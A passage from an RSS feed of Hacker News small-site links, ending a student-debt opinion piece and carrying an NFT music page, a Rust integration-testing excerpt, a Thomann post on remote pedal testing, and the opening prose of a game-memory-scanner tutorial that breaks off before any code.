benefit. </p><p>What of Schumer‚Äôs claim that it would stimulate the economy? </p><p>Good stimulus measures immediately put extra cash in people‚Äôs hands. Forgiving student debt wouldn‚Äôt achieve this. The Trump administration <a href="https://studentaid.gov/announcements-events/coronavirus">already suspended payments</a> during the pandemic, and Jason Furman, former chairman of President Obama‚Äôs Council of Economic Advisers, <a href="https://twitter.com/jasonfurman/status/1328193936364539909">estimates that</a> debt forgiveness ‚Äúlikely has a multiplier close to zero.‚Äù</p><p>What about the racial wealth gap? Many advocates of student-debt forgiveness point to <a href="https://www.forbes.com/sites/korihale/2020/12/08/biden-cancelling-student-loans-could-close-the-racial-wealth-gap/?sh=5db0ec936cb6">uneven rates of borrowing</a> between young black and white adults, with the former often taking more debt than the latter. </p><p>The Duke University economist William A. Darity Jr., a <a href="https://twitter.com/SandyDarity/status/1334089836916043776">supporter</a> of student-debt forgiveness, examined this question in a <a href="https://socialequity.duke.edu/wp-content/uploads/2019/10/Running-the-Numbers-8.4.19-FINAL.pdf">2019 paper</a> that included analyses of the proposal by Warren and another by Bernie Sanders, who wanted to eliminate all student debt. ‚ÄúOn the face of it, this would be a universal program that would disproportionately benefit black students because they hold a larger average amount of debt,‚Äù Darity wrote. But we also have to weigh this fact against the ‚Äúenrollment rates for each group, because those who do not enroll in college or university do not acquire student loan debt.‚Äù Once you take this into account, by simply wiping out student debt, the ‚Äúeffect on the mean gap‚Äù between black and white wealth would be ‚Äúimperceptible.‚Äù </p><p>A <a href="https://www.demos.org/research/less-debt-more-equity-lowering-student-debt-while-closing-black-white-wealth-gap">2015 analysis</a> by the think tank Demos was even more pessimistic about the impact of untargeted debt forgiveness. ‚ÄúWhile eliminating student debt for all households regardless of income increases median net worth for young white and Black households, white families see a greater benefit likely due to a higher likelihood of completing college and graduate degree programs,‚Äù it said. ‚ÄúPolicies which eliminate all student debt for young households would expand the divide between median Black and white wealth by an additional 9%.‚Äù </p><p>So why are leading Democrats entranced by the proposal?</p><p><strong>One way to look at politics is through the lens of class interests.</strong> The Democratic Party is increasingly <a href="http://piketty.pse.ens.fr/files/Piketty2018.pdf">the party of college graduates</a>. In states such as Georgia, well-educated suburban whites formed the backbone of swing voters whom the party has relied on to make gains. A student-debt bailout is essentially representing their class interests, even if it‚Äôs far from an ideal policy to help the underprivileged. </p><p>None of this is to argue that we should do nothing about student debt. It is a growing problem worth addressing, and there are proposals on the <a href="https://www.brookings.edu/research/end-government-profits-on-student-loans-shift-risk-and-lower-interest-rates/">left</a> and <a href="https://www.hawley.senate.gov/sen-hawley-break-higher-education-monopoly-provide-more-options-career-training">right</a> worth considering, ranging from lowering interest rates to holding colleges themselves accountable for the amount of debt their students accrue. </p><p>For his part, Biden has asked Congress to send him a bill to <a href="https://www.cnbc.com/2021/01/08/student-loan-forgiveness-could-be-more-likely-but-challenges-remain-.html">forgive $10,000 of student debt</a> per borrower. While simply writing off a $50,000 debt would be a giveaway to an awful lot of well-paid doctors and lawyers, forgiving up to $10,000 of debt could be welcome relief for students who attended college but dropped out‚Äîthe average person in this category has <a href="https://www.usnews.com/news/data-mine/articles/2017-11-07/federal-data-show-39-million-students-dropped-out-of-college-with-debt-in-2015-and-2016">less than $10,000 of debt</a> without getting the earning benefits of a college degree.</p><p>But if we really want to achieve the goals Schumer espouses, we should talk about aiding the least among us. As Matt Bruenig of the People‚Äôs Policy Project <a href="https://www.peoplespolicyproject.org/2017/09/12/who-was-in-poverty-in-2016/">has shown</a>, poverty in America is heavily concentrated among the children, elderly and disabled. These people would not directly benefit from a student-debt bailout‚Äîbut there is a promising proposal that could do a lot to help them.</p><p>The Utah Republican, Senator Mitt Romney, is proposing the <a href="https://www.romney.senate.gov/romney-offers-path-provide-greater-financial-security-american-families">Family Security Act</a>, to create a monthly cash benefit for families, with $350 per child up to age 5, and $250 for each child between ages 6 and 17. The Niskanen Center estimates that Romney‚Äôs legislation would cut child poverty by <a href="https://www.niskanencenter.org/factsheet-senator-romneys-family-security-act/">around a third</a>, which would not only immediately benefit poor families but would have cascading effects on the prospects of their children. It would also please fiscal conservatives because Romney‚Äôs proposal is deficit-neutral, consolidating federal programs while ending the State and Local Tax deduction, <a href="https://www.cbpp.org/research/federal-tax/repealing-salt-cap-would-be-regressive-and-proposed-offset-would-use-up-needed">which is a regressive deduction</a>.</p><p>We live in a rich country, but one with a substantial number of people who aren‚Äôt sharing in that wealth. We could choose, like Schumer, to spend $1 trillion that would end up benefiting many who are already financially stable, healthy and upwardly mobile. Or we could focus our resources on those who are not sharing in the great promise of America. The choice is obvious.</p><p><strong>Zaid Jilani is a journalist based in Arlington, Virginia. He has worked for University of California Berkeley</strong>‚Äô<strong>s Greater Good Science Center, </strong><em><strong>The Intercept</strong></em><strong>, and the Center for American Progress.</strong></p></div></div>]]>
            </description>
            <link>https://www.persuasion.community/p/dont-cancel-student-debt</link>
            <guid isPermaLink="false">hacker-news-small-sites-26198267</guid>
            <pubDate>Fri, 19 Feb 2021 21:30:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First song made into executable WASM binary and stored on-chain as NFT]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26198251">thread link</a>) | @pndpo
<br/>
February 19, 2021 | https://petersalomonsen.com/nftmusic/ | <a href="https://web.archive.org/web/*/https://petersalomonsen.com/nftmusic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
        
        <p>
            Welcome to the first music stored in a blockchain as a <a href="https://en.wikipedia.org/wiki/Non-fungible_token" target="_blank">Non-Fungle Token (NFT)</a>.
        </p>
        <h3>License</h3>
        <p>If you decide to buy this, you are accepting the <a href="https://www.nftlicense.org/" target="_blank">NFT
                license</a>. Make sure to read it carefully.</p>

        <h3>About the music</h3>
        <p>The track, which you can listen to at <a href="https://soundcloud.com/psalomo/webchip-music">soundcloud</a>
            (and other places), was one of the first pieces of music rendered to an "executable" <a href="https://en.wikipedia.org/wiki/WebAssembly" target="_blank">WebAssembly</a> binary.
            By using a WebAssembly runtime to execute the wasm binary file, you will get raw audio data in the output
            that you can open in an audio editor. This was demonstrated at the <a href="https://www.youtube.com/watch?t=1690&amp;v=C8j_ieOm4vE&amp;feature=youtu.be" target="_blank">WebAssembly
                Summit 2020</a>.
            Instructions can also be found in the zip file that is available for download from this web-page to the
            token owner.
        </p>

        <h3>What do I get when buying this?</h3>
        <p>
            Note that since this is stored on-chain, it is not protected from others to see or get.
            However you'll get the rights as found in the LICENSE.txt file that is part of the zip archive stored with
            this NFT.
            Also the smart contract will recognize your account as the owner of the NFT. The source code of the smart
            contract
            can be found <a target="_blank" href="https://github.com/petersalomonsen/NFT/tree/nft-with-content/contracts/assemblyscript/nep4-basic">here</a>
        </p>
        <p>Also see the <a target="_blank" href="https://youtu.be/hAvIm0F3scg">demo-video</a> of how to re-sell the NFT
            or download the
            content.</p>
        
        <p>The NFT is currently owned by: <span id="ownerspan"></span></p>
        

        

        
    </div></div>]]>
            </description>
            <link>https://petersalomonsen.com/nftmusic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26198251</guid>
            <pubDate>Fri, 19 Feb 2021 21:28:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Skeleton and Principles for a Maintainable Test Suite]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26198173">thread link</a>) | @lukastyrychtr
<br/>
February 19, 2021 | https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/ | <a href="https://web.archive.org/web/*/https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <article>
    
      
      
<ul id="frontmatter">
    <li>
        <time datetime="2021-02-14T14:00:10.47Z">February 14, 2021</time>
    </li>
    <span></span>
    <li> 4133 words </li>
    <span></span>
    <li> 21 min </li>
</ul>

      <blockquote>
<p>This article is a sample from <a href="https://zero2prod.com/"><strong>Zero To Production In Rust</strong></a>, a book on backend development in Rust.<br>
You can get a copy of the book on <a href="https://zero2prod.com/">zero2prod.com</a>.<br>
<a href="https://www.lpalmieri.com/subscribe">Subscribe to the newsletter</a> to be notified when a new episode is published.</p>
</blockquote>

<p>We have used a test-driven approach to write all new pieces of functionality throughout the book.<br>
While this strategy has served us well, we have not invested a lot of time into <em>refactoring</em> our test code. As a result, our <code>tests</code> folder is a bit of mess at this point.<br>
Before moving forward, we will restructure our integration test suite to support us as our application grows in complexity and the number of tests increases.</p>

<ol>
<li><a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/#why-do-we-write-tests">Why Do We Write Tests?</a></li>
<li><a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/#why-dont-we-write-tests">Why Don't We Write Tests?</a></li>
<li><a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/#test-code-is-still-code">Test Code Is Still Code</a></li>
<li><a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/#our-test-suite">Our Test Suite</a></li>
<li><a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/#test-discovery">Test Discovery</a></li>
<li><a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/#one-test-file-one-crate">One Test File, One Crate</a></li>
<li><a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/#sharing-test-helpers">Sharing Test Helpers</a></li>
<li><a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/#sharing-startup-logic">Sharing Startup Logic</a>
<ul>
<li><a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/#extracting-our-startup-code">Extracting Our Startup Code</a></li>
<li><a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/#testing-hooks-in-our-startup-logic">Testing Hooks In Our Startup Logic</a></li>
</ul>
</li>
<li><a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/#build-an-api-client">Build An API Client</a></li>
<li><a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/#summary">Summary</a></li>
</ol>

<p>Is writing tests a good use of developers' time?</p>
<p>A good test suite is, first and foremost, a risk-mitigation measure.<br>
Automated tests reduce the risk associated with changes to an existing codebase - most regressions and bugs are caught in the continuous integration pipeline and never reach users. The team is therefore empowered to iterate faster and release more often.</p>
<p>Tests act as documentation as well.<br>
The test suite is often the best starting point when deep-diving in an unknown code base - it shows you how the code is supposed to behave and what scenarios are considered relevant enough to have dedicated tests for.</p>
<p>"Write a test suite!" should definitely be on your to-do list if you want to make your project more welcoming to new contributors.</p>
<p>There are other positive side-effects often associated with good tests - modularity, decoupling. These are harder to quantify, as we have yet to agree as an industry on what "good code" looks like.</p>

<p>Although there are compelling reasons to invest time and effort in writing a good test suite, reality is somewhat messier.</p>
<p>First, the development community did not always believe in the value of testing.<br>
We can find examples of test-driven development throughout the history of the discipline, but it is only with the "Extreme Programming" (XP) book that the practice entered the mainstream debate - in 1999!</p>
<p>Paradigm shifts do not happen overnight - it took years for the test-driven approach to gain traction as a "best practice" within the industry.</p>
<p>If test-driven development has won the minds and hearts of developers, the battle with management is often still undergoing.<br>
Good tests build technical leverage, but writing tests takes time. When a deadline is pressing, testing is often the first to be sacrificed.</p>
<p>As a consequence, most of the material you find around is either an introduction to testing or a guide on how to pitch its value to stakeholders.<br>
There is very little about testing <em>at scale</em> - what happens if you stick to the book and keep writing tests as the codebase grows to tens of thousands of lines, with hundreds of test cases?</p>

<p>All test suites start in the same way: an empty file, a world of possibilities.<br>
You go in, you add the first test. Easy, done.<br>
Then the second. Boom.<br>
The third. You just had to copy a few lines from the first, all good.<br>
The fourth...</p>
<p>After a while, test coverage starts to go down: new code is less thoroughly tested than the code you wrote at the very beginning of the project. Have you started to doubt the value of tests?<br>
Absolutely not, tests are great!<br>
Yet, you are writing fewer tests as the project moves forward.<br>
It's because of friction - it got progressively more cumbersome to write new tests as the codebase evolved.</p>
<blockquote>
<p>Test code is still code.</p>
</blockquote>
<p>It has to be modular, well-structured, sufficiently documented. It requires maintenance.<br>
If we do not actively invest in the health of our test suite, it will rot over time.<br>
Coverage goes down and soon enough we will find critical paths in our application code that are never exercised by automated tests.</p>
<p>You need to regularly step back to take a look at your test suite <em>as a whole</em>.<br>
Time to look at ours, isn't it?</p>

<p>All our integration tests live within a single file, <code>tests/health_check.rs</code>:</p>
<pre><code><span>//! tests/health_check.rs
// [...]

// Ensure that the `tracing` stack is only initialised once using `lazy_static`
</span><span>lazy_static::lazy_static! {
    </span><span>static ref </span><span>TRACING</span><span>: () = {
        </span><span>let</span><span> filter = </span><span>if </span><span>std::env::var("</span><span>TEST_LOG</span><span>").</span><span>is_ok</span><span>() { "</span><span>debug</span><span>" } </span><span>else </span><span>{ "" };
        </span><span>let</span><span> subscriber = </span><span>get_subscriber</span><span>("</span><span>test</span><span>".</span><span>into</span><span>(), filter.</span><span>into</span><span>());
        </span><span>init_subscriber</span><span>(subscriber);
    };
}

</span><span>pub struct </span><span>TestApp {
    </span><span>pub </span><span>address</span><span>: String,
    </span><span>pub </span><span>db_pool</span><span>: PgPool,
}

async </span><span>fn </span><span>spawn_app</span><span>() -&gt; TestApp {
    </span><span>// [...]
</span><span>}

</span><span>pub</span><span> async </span><span>fn </span><span>configure_database</span><span>(</span><span>config</span><span>: &amp;DatabaseSettings) -&gt; PgPool {
    </span><span>// [...]
</span><span>}

#[</span><span>actix_rt</span><span>::</span><span>test</span><span>]
async </span><span>fn </span><span>health_check_works</span><span>() {
    </span><span>// [...]
</span><span>}

#[</span><span>actix_rt</span><span>::</span><span>test</span><span>]
async </span><span>fn </span><span>subscribe_returns_a_200_for_valid_form_data</span><span>() {
    </span><span>// [...]
</span><span>}

#[</span><span>actix_rt</span><span>::</span><span>test</span><span>]
async </span><span>fn </span><span>subscribe_returns_a_400_when_data_is_missing</span><span>() {
    </span><span>// [...]
</span><span>}

#[</span><span>actix_rt</span><span>::</span><span>test</span><span>]
async </span><span>fn </span><span>subscribe_returns_a_400_when_fields_are_present_but_invalid</span><span>() {
    </span><span>// [...]
</span><span>}
</span></code></pre>
<p>There is only one test dealing with our health check endpoint - <code>health_check_works</code>.<br>
The other three tests are probing our <code>POST /subscriptions</code> endpoint while the rest of the code deals with shared setup steps (<code>spawn_app</code>, <code>TestApp</code>, <code>configure_database</code>, <code>TRACING</code>).</p>
<p>Why have we shoved everything in <code>tests/health_check.rs</code>?<br>
Because it was convenient!<br>
The setup functions were already there - it was easier to add another test case within the same file than figuring out how to share that code properly across multiple test modules.</p>
<p>Our main goal in this refactoring is <em>discoverability</em>: </p>
<ul>
<li>given an application endpoint, it should be easy to find the corresponding integration tests within the <code>tests</code> folder;</li>
<li>when writing a test, it should be easy to find the relevant test helper functions.</li>
</ul>
<p>We will focus on folder structure, but that  is definitely not the only tool available when it comes to test discovery.<br>
Test coverage tools can often tell you which tests triggered the execution of a certain line of application code.<br>
You can rely on techniques such as <a href="https://ferrous-systems.com/blog/coverage-marks/">coverage marks</a> to create an obvious link between test and application code.</p>
<p>As always, a multi-pronged approach is likely to give you the best results as the complexity of your test suite increases.</p>

<p>Before we start moving things around, let's nail down a few facts about integration testing in Rust.<br>
The <code>tests</code> folder is somewhat special - <code>cargo</code> knows to look into it searching for integration tests.</p>
<p>Each file within the <code>tests</code> folder gets compiled as its own crate.<br>
We can check this out by running <code>cargo build --tests</code> and then looking under <code>target/debug/deps</code>:</p>
<pre><code><span># Build test code, without running tests 
</span><span>cargo</span><span> build</span><span> --tests
</span><span># Find all files with a name starting with `health_check` 
</span><span>ls</span><span> target/debug/deps | </span><span>grep</span><span> health_check
</span></code></pre><pre><code><span>health_check-fc23645bf877da35
health_check-fc23645bf877da35.d
</span></code></pre>
<p>The trailing hashes will likely be different on your machine, but there should be two entries starting with <code>health_check-*</code>.<br>
What happens if you try to run it? </p>
<pre><code><span>./target/debug/deps/health_check-fc23645bf877da35
</span></code></pre><pre><code><span>running</span><span> 4 tests
</span><span>test</span><span> health_check_works ... ok
</span><span>test</span><span> subscribe_returns_a_400_when_fields_are_present_but_invalid ... ok
</span><span>test</span><span> subscribe_returns_a_400_when_data_is_missing ... ok
</span><span>test</span><span> subscribe_returns_a_200_for_valid_form_data ... ok

</span><span>test</span><span> result: ok. 4 passed; </span><span>finished</span><span> in 0.44s
</span></code></pre>
<p>That's right, it runs our integration tests!<br>
If we had five <code>*.rs</code> files under <code>tests</code>, we'd find five executables in <code>target/debug/deps</code>.</p>

<p>If each integration test file is its own executable, how do we share test helpers functions?</p>
<p>The first option is to define a stand-alone module - e.g. <code>tests/helpers/mod.rs</code><sup><a href="#test-common-folder">1</a></sup>.<br>
You can add common functions in <code>mod.rs</code> (or define other sub-modules in there) and then refer to <code>helpers</code> in your test file (e.g. <code>tests/health_check.rs</code>) with:</p>
<pre><code><span>//! tests/health_check.rs
// [...]
</span><span>mod </span><span>helpers;

</span><span>// [...]
</span></code></pre>
<p><code>helpers</code> is bundled in the <code>health_check</code> test executable as a sub-module and we get access to the functions it exposes in our test cases.<br>
This approach works fairly well to start out, but it leads to annoying <code>function is never used</code> warnings down the line.<br>
The issue is that <code>helpers</code> is bundled as a sub-module, it is not invoked as a third-party crate: <code>cargo</code> compiles each test executable in isolation and warns us if, for a specific test file, one or more public functions in <code>helpers</code> have never been invoked. This is bound to happen as your test suite grows - not all test files will use <em>all</em> your helper methods.</p>
<p>The second option takes full advantage of that each file under <code>tests</code> is its own executable - we can create sub-modules <em>scoped to a single test executable</em>!<br>
Let's create an <code>api</code> folder under <code>tests</code>, with a single <code>main.rs</code> file inside:</p>
<pre><code><span>tests/
  api/
    main.rs
  health_check.rs
</span></code></pre>
<p>First, we gain clarity: we are structuring <code>api</code> in the very same way we would structure a binary crate. Less magic - it builds on the same knowledge of the module system you built while working on application code.<br>
If you run <code>cargo build --tests</code> you should be able to spot</p>
<pre><code><span>Running</span><span> target/debug/deps/api-0a1bfb817843fdcf

</span><span>running</span><span> 0 tests

</span><span>test</span><span> result: ok. 0 passed; </span><span>finished</span><span> in 0.00s
</span></code></pre>
<p>in the output - <code>cargo</code> compiled <code>api</code> as a test executable, looking for tests cases.<br>
There is no need to define a <code>main</code> function in <code>main.rs</code> - the Rust test framework adds one for us behind the scenes<sup><a href="#custom-test-framework">2</a></sup>.</p>
<p>We can now add sub-modules in <code>main.rs</code>:</p>
<pre><code><span>//! tests/api/main.rs

</span><span>mod </span><span>helpers;
</span><span>mod </span><span>health_check;
</span><span>mod </span><span>subscriptions;
</span></code></pre>
<p>Add three empty files - <code>tests/api/helpers.rs</code>, <code>tests/api/health_check.rs</code> and <code>tests/api/subscriptions.rs</code>.<br>
Time to delete <code>tests/health_check.rs</code> and re-distribute its content:</p>
<pre><code><span>//! tests/api/helpers.rs
</span><span>use </span><span>sqlx::{Connection, Executor, PgConnection, PgPool};
</span><span>use </span><span>std::net::TcpListener;
</span><span>use </span><span>uuid::Uuid;
</span><span>use </span><span>zero2prod::configuration::{get_configuration, DatabaseSettings};
</span><span>use </span><span>zero2prod::e‚Ä¶</span></code></pre></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/">https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/</a></em></p>]]>
            </description>
            <link>https://www.lpalmieri.com/posts/skeleton-and-principles-for-a-maintainable-test-suite/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26198173</guid>
            <pubDate>Fri, 19 Feb 2021 21:20:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stompenberg FX: Testing guitar effects pedal remotely]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26197848">thread link</a>) | @xavieralexandre
<br/>
February 19, 2021 | https://www.thomann.de/blog/en/stompenberg-effects/ | <a href="https://web.archive.org/web/*/https://www.thomann.de/blog/en/stompenberg-effects/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>The idea</h3><p><strong>Stompenberg.</strong> Sounds like a brand of Swedish outdoor clothing, but also like a villain in the next James Bond film ‚Äì but in this case it‚Äôs actually a mash-up of two things. Stompenberg is the hybrid of <strong>‚Äústomp boxes‚Äù</strong> and <strong>‚ÄúHeisenberg‚Äù,</strong> which made the impossible possible after a long time of <strong>screwing</strong> and <strong>soldering.</strong>&nbsp;It‚Äôs a Thomann <strong>online app</strong> that allows musicians to<strong> test out real effect pedals</strong> with their own equipment, either <strong>from home</strong> or <strong>on the go</strong>. Below you will get a brief idea of the concept, development and implementation and of what <strong>Stompenberg</strong>&nbsp;is capable of‚Ä¶ üí•üé∂</p><hr><h3>Growing pains</h3><h4><strong>Planning&nbsp;</strong></h4><p>The <a href="https://www.thomann.de/gb/stompenberg_devices.html" target="_blank" rel="noopener noreferrer"><strong>selected pedals</strong></a> travel to the<strong> Thomann partner laboratory</strong> in <strong>Erlangen, Germany</strong> where they undergo some <strong>operations</strong> and <b>transformations&nbsp;</b>by our men in white with the <strong>license to solder.</strong></p><p>The following happens: A pedal is first deprived of its <strong>shell</strong>, <strong>pots</strong> and <strong>switches.</strong> The pots are measured to see what they do (whether they are <strong>linear, logarithmic,</strong> etc.) and replaced with <strong>digital pots</strong> and <strong>switches.</strong></p><p>Then, for reasons of shielding, the original <strong>housing</strong> is put back on. Everything is recognisable as a pedal again, but now, instead of pots and switches, <strong>ribbon cables</strong> hang from the orphaned holes.</p><h4><strong>The construction</strong></h4><p>This ever-growing Frankenstein is mounted on a <strong>rack drawer,</strong> which houses not only the <strong>power supply</strong> but also a <strong>mini-computer</strong> specially developed for this purpose, per pedal.</p><p><strong>Ribbon cable</strong> runs to the computer, audio cable into the pedal, everything is beautifully adjusted and balanced and then off to the rack!</p><p><img src="https://www.thomann.de/blog/wp-content/uploads/2018/12/1-1-300x200.jpg"></p><p><img src="https://www.thomann.de/blog/wp-content/uploads/2018/12/2-1-300x200.jpg"></p><p><img src="https://www.thomann.de/blog/wp-content/uploads/2018/12/4-300x200.jpg"></p><p><img src="https://www.thomann.de/blog/wp-content/uploads/2018/12/3-1-300x200.jpg"></p><hr><h3>Connection to the shop</h3><h4><strong>The longest guitar cable in the world‚Ä¶</strong></h4><p>‚Ä¶ is available from <strong>Thomann</strong> in the <strong>shop,</strong> but not from <strong><a href="https://www.thomann.de/gb/stompenberg_devices.html">Stompenberg</a>.</strong> From now on the <strong>soldering iron</strong> gets put away and is replaced by a <strong>PC</strong> and <strong>keyboard</strong> in Thomann‚Äôs Treppendorf. This is where our <strong>developers</strong> and <strong>designers</strong> sit, brooding over the visualization of the pedals and the interface that allows the pedals to be operated from anywhere in the world. From the logo to the controls to each button, everything comes from Thomann‚Äôs teamwork.</p><p>When you turn the <strong>virtual knob</strong> at home, the <strong>digital knob</strong> on the pedal in the Thomann lab is adjusted via this interface, while your sound runs through exactly this pedal and comes back to you with effect. There are<strong> 3</strong> <strong>modes</strong> and a lot of <strong>UI tricks</strong> to discover.</p><p><img src="https://www.thomann.de/blog/wp-content/uploads/2018/12/lava-150x150.jpg" width="275">&nbsp; <img src="https://www.thomann.de/blog/wp-content/uploads/2018/12/6-1024x682.jpg" width="412"></p><hr><h2><strong>The Interface</strong></h2><h4><strong>The effect device</strong></h4><p>Design and development flow together here with loving attention to detail: Every <strong>knob</strong> can be rotated, every <strong>footswitch</strong> can be stepped on and every <strong>lever</strong> is slidable. This replica <strong>behaves exactly like the real pedal</strong> in the lab, right down to the smallest <strong>LED,</strong> and can therefore be operated in exactly the same way.</p><h4><strong>The three modes: PLAY, REC &amp; LIVE</strong></h4><p><strong>PLAY:</strong> You feed <strong>pre-recorded samples</strong> or specially <strong>uploaded sounds</strong> through the pedals and operate the controls with <strong>both hands</strong> (if using a <strong>touchscreen)</strong> while the sound loops through the effect pedal.</p><p><strong>REC:</strong> If you want to go a step beyond, you can <strong>record your own riffs</strong> and loop them through the pedal of your choice!</p><p><strong>LIVE:</strong> The ultimate experience ‚Äì here you <strong>play live</strong> and get the result back directly from the Thomann lab. So you can try out the pedal, live, from the comfort of your bedroom, with just a small <strong>latency,</strong> but that‚Äôs not bad considering the signal travels virtually at the speed of light&nbsp;through the<strong> whole of Germany or even the whole of Europe.&nbsp;</strong></p><p>The bright side: Even if your pedal is busy and you end up in the waiting queue, you don‚Äôt have to listen to the dude in front of you butchering a cover of Stairway To Heaven üòâ</p><h4><strong>And the rest of my equipment?</strong></h4><p>If you want to know exactly how the distortion in front of your own amp is done, you might need a <strong>reamping box.</strong> But under certain circumstances the line output of the interface does the trick too, just turned down low. The result reads like a poem:</p><p>You play your own guitar</p><p>through a real pedal (which is somewhere else)</p><p>through your amp</p><p>through your cabinet or speakers</p><p>at the volume you want</p><p>and you can turn, shift and control all the knobs as you like.</p><p>‚Ä¶ and get a pretty accurate picture if this pedal will be your new one or if you prefer another one (which you tested with Stompenberg). No need to drive to Treppendorf, to send cardboard boxes back to Thomann halfway around the world, or to listen to annoying comments from the people waiting in line.</p><p><img loading="lazy" src="https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1.jpg" alt="" width="1400" height="626" srcset="https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1.jpg 1400w, https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1-565x253.jpg 565w, https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1-300x134.jpg 300w, https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1-768x343.jpg 768w, https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1-1024x458.jpg 1024w, https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1-215x96.jpg 215w" sizes="(max-width: 1400px) 100vw, 1400px"></p><hr><h3><strong>The Future</strong></h3><p>The conversion is in full swing and while <strong>Stompenberg</strong> is running, our partners in <strong>Erlangen</strong> are taking more pedals apart every day to make them digitally accessible. There is plenty of room for <strong>growth</strong> ‚Äì ultimately, your <strong>demand</strong> determines the <strong>supply</strong> of pedals. So let‚Äôs go, the smiles of satisfied guitarists are what keep us motivated!</p><p>Your Thomann R&amp;D Team</p><hr><h2><a href="https://www.thomann.de/gb/stompenberg_devices.html" target="_blank" rel="noopener noreferrer">Get stompin‚Äô at Stompenberg now</a>!</h2><p>Our<strong> YouTube</strong> host <strong>Felix Fleer</strong> took a closer look at Stompberg. Enjoy the <strong>video</strong> and try out the tool yourself!</p><p><span><iframe width="640" height="360" src="https://www.youtube-nocookie.com/embed/1lBYRQUTzYk?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-GB&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p><div><p><img alt="Author‚Äôs gravatar" src="https://secure.gravatar.com/avatar/c9e90005014b2194675c8a066705c293?s=90&amp;d=blank&amp;r=g" srcset="https://secure.gravatar.com/avatar/c9e90005014b2194675c8a066705c293?s=180&amp;d=blank&amp;r=g 2x" height="90" width="90" loading="lazy"></p><p> Joe has been singing since he can remember and started playing guitar when he was 10. He's been using it as a songwriting tool ever since. He is passionate about melody and harmony and admires musicians who create these in unique ways. Check out his alternative / indie projects Best of Feelings and Zef Raƒçek.</p></div></div></div>]]>
            </description>
            <link>https://www.thomann.de/blog/en/stompenberg-effects/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26197848</guid>
            <pubDate>Fri, 19 Feb 2021 20:46:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing our own Cheat Engine: Exact Value scanning]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26197828">thread link</a>) | @lukastyrychtr
<br/>
February 19, 2021 | https://lonami.dev/blog/woce-2/ | <a href="https://web.archive.org/web/*/https://lonami.dev/blog/woce-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>2021-02-12</p><p>last updated 2021-02-19</p></div><p>This is part 2 on the <em>Writing our own Cheat Engine</em> series:</p><ul><li><a href="https://lonami.dev/blog/woce-1">Part 1: Introduction</a> (start here if you're new to the series!)</li><li>Part 2: Exact Value scanning</li><li><a href="https://lonami.dev/blog/woce-3">Part 3: Unknown initial value</a></li></ul><p>In the introduction, we spent a good deal of time enumerating all running processes just so we could find out the pid we cared about. With the pid now in our hands, we can do pretty much anything to its corresponding process.</p><p>It's now time to read the process' memory and write to it. If our process was a single-player game, this would enable us to do things like setting a very high value on the player's current health pool, making us invincible. This technique will often not work for multi-player games, because the server likely knows your true current health (the most you could probably do is make the client render an incorrect value). However, if the server is crappy and it trusts the client, then you're still free to mess around with your current health.</p><p>Even if we don't want to write to the process' memory, reading is still very useful. Maybe you could enhance your experience by making a custom overlay that displays useful information, or something that makes noise if it detects the life is too low, or even simulating a keyboard event to automatically recover some mana when you're running low.</p><p>Be warned about anti-cheat systems. Anything beyond a basic game is likely to have some protection measures in place, making the analysis more difficult (perhaps the values are scrambled in memory), or even pinging the server if it detects something fishy.</p><p><strong>I am not responsible for any bans!</strong> Use your brain before messing with online games, and don't ruin the fun for everyone else. If you get caught for cheating, I don't want to know about it.</p><p>Now that all <a href="https://www.urbandictionary.com/define.php?term=script%20kiddie">script kiddies</a> have left the room, let's proceed with the post.</p><h2 id="exact-value-scanning">Exact Value scanning</h2><details 